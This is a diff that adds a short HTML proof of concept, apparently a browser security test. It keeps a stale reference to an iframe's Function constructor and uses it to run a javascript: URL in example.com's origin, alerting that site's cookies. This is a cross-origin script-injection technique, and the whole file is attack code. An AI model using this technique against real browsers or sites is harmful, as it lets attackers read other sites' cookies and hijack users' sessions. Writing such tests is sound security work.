@@ -1,0 +1,10 @@
+<iframe></iframe>
+<script>
+var i = document.querySelector('iframe');
+var f = frames[0].Function;
+i.onload = function() {
+// Alerting the cookie of http://example.com
+f("location.replace('javascript:alert(document.cookie)')")();
+}
+i.src = 'http://example.com';
+</script>
